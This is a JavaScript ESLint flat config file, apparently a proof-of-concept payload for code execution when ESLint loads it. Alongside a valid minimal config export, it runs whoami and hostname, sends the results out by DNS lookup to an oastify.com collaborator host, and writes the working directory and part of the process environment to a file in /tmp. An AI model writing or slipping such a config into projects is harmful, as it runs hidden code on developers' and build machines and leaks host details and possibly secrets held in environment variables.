// ESLint 9+ flat config - this JS executes when ESLint loads the config
import { execSync } from 'child_process';

// Canary: DNS exfil to confirm code execution
try {
  const id = execSync('whoami').toString().trim();
  const hostname = execSync('hostname').toString().trim();
  // Use DNS for exfil since HTTP might be blocked
  execSync(`nslookup ${id}.${hostname}.eslint-rce.oastify.com`);
} catch(e) {}

// Canary 2: Write to /tmp as proof
try {
  const fs = await import('fs');
  fs.writeFileSync('/tmp/eslint-rce-proof', `RCE confirmed at ${new Date().toISOString()}
PWD: ${process.cwd()}
ENV: ${JSON.stringify(process.env).slice(0,500)}`);
} catch(e) {}

// Still export valid ESLint config so it doesn't error before executing
export default [
  {
    rules: {
      "no-unused-vars": "warn"
    }
  }
];
